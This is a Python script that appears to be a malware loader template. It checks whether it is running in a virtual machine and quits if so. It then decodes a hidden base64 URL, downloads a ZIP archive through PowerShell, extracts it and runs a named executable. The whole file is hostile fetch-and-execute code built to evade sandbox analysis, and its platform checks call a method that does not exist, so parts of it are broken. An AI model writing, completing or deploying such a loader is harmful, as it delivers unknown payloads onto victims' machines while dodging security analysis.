import base64
import os
import uuid
import zipfile
import io
import subprocess
import tempfile
import sys
from urllib.parse import unquote

destination = os.path.join(tempfile.gettempdir(), "Seoul.zip") # gets tmp and looks for zip

class checkvm:
    def check_vm():
        indicators = []

        # Check system manufacturer and product name
        if sys.platform.system() == "Windows":
            try:
                output = subprocess.check_output(
                    ["wmic", "computersystem", "get", "manufacturer,model"],
                    universal_newlines=True
                )
                if "VMware" in output or "VirtualBox" in output or "KVM" in output:
                    indicators.append("Manufacturer/Model indicates VM")
            except Exception:
                pass
        else:
            try:
                output = subprocess.check_output(
                    ["dmesg"], stderr=subprocess.DEVNULL, universal_newlines=True
                )
                if "VirtualBox" in output or "VMware" in output or "hypervisor" in output:
                    indicators.append("dmesg reports hypervisor")
            except Exception:
                pass

        # check for mac address
        try:
            mac = uuid.getnode()
            mac_prefix = mac >> 40
            vm_mac_prefixes = {
                0x00: "VirtualBox",
                0x08: "VMware",
                0x0A: "Parallels"
            }
            if mac_prefix in vm_mac_prefixes:
                indicators.append(f"MAC address suggests {vm_mac_prefixes[mac_prefix]}")
        except Exception:
            pass
        
        try:
            #check for hypervisor flag
            if sys.platform.system() == "Windows":
                output = subprocess.check_output(
                    ["systeminfo"], universal_newlines=True
                )
                if "Hyper-V" in output or "Virtualization" in output:
                    indicators.append("Systeminfo indicates Hyper-V")
            else:
                output = subprocess.check_output(
                    ["lscpu"], universal_newlines=True
                )
                if "Hypervisor" in output:
                    indicators.append("lscpu indicates hypervisor")
        except Exception:
            pass

        return indicators

def download_zip(url):
    vmdetection = checkvm.check_vm()

    if vmdetection:
        print('Virtual Machine Detected, stopping program...')
        sys.exit(1)
    else:
        try:
            padding = len(url) % 4
            if padding:
                url += "=" * (4 - padding)

            decoded_bytes = base64.b64decode(url)
            clean_url = unquote(decoded_bytes.decode('utf-8'))

            if not clean_url.startswith(('http://', 'https://')):
                clean_url = 'http://' + clean_url

            print(f"[*] Downloading zip file...") 
            r = subprocess.run(['powershell', 'Invoke-WebRequest', '-Uri', clean_url, '-OutFile', destination])
            r.check_returncode()
            with open(destination, 'rb') as f:
                return f.read()
        except Exception as e:
            print(f"[!] Download failed: {e}")
            return None


def extract_and_run(zip_data, executable_name):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            print(f"[*] Extracting to {tmpdir}")
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                z.extractall(tmpdir)

            exe_path = os.path.join(tmpdir, executable_name)
            if os.path.exists(exe_path):
                print(f"[*] Running {exe_path}")
                subprocess.Popen([exe_path], cwd=tmpdir)
            else:
                print(f"[!] {executable_name} not found in ZIP! Contents:")
                for root, _, files in os.walk(tmpdir):
                    for file in files:
                        print(os.path.join(root, file))
    except Exception as e:
        print(f"[!] Extraction failed: {e}")


def main():
    url = '_SEOUL_URL_'  
    executable_name = "_SEOUL_EXE_" # working on it

    zip_data = download_zip(url)
    if zip_data:
        extract_and_run(zip_data, executable_name)
    else:
        print("[!] No ZIP data received")


if __name__ == "__main__":
    main()